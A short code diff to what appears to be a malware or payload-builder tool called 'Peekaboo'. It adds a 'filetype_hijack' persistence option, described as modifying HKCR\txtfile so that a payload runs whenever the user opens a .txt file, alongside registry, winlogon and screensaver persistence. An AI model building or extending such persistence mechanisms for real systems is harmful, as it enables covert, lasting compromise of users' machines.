@@ -18,7 +18,7 @@ PRAGMA_ONCE_RE = re.compile(r'^\s*#\s*pragma\s+once\s*$', re.M)
 IFDEF_GUARD_RE = re.compile(r'^\s*#\s*ifndef\s+([A-Za-z_]\w*)\s*\n\s*#\s*define\s+\1\s*', re.M)
 ENDIF_RE = re.compile(r'^\s*#\s*endif\b.*$', re.M | re.M)
 PAYLOAD_PLACEHOLDER = "PAYLOAD_PLACEHOLDER"
-PERSISTENCE_TYPES = ["none", "registry_run", "winlogon", "screensaver"]
+PERSISTENCE_TYPES = ["none", "registry_run", "winlogon", "screensaver", "filetype_hijack"]
 
 
 class Colors:
@@ -720,6 +720,9 @@ class Peekaboo:
                 print(Colors.info("   in the same directory as persistence.exe"))
                 if self.persistence_type == "winlogon":
                     print(Colors.warning("note: winlogon requires SYSTEM/admin privileges"))
+                if self.persistence_type == "filetype_hijack":
+                    print(Colors.warning("note: filetype_hijack modifies HKCR\\txtfile - may require admin or registry ownership"))
+                    print(Colors.info("      triggered every time the user opens any .txt file"))
             print(sep)
         except Exception:
             pass
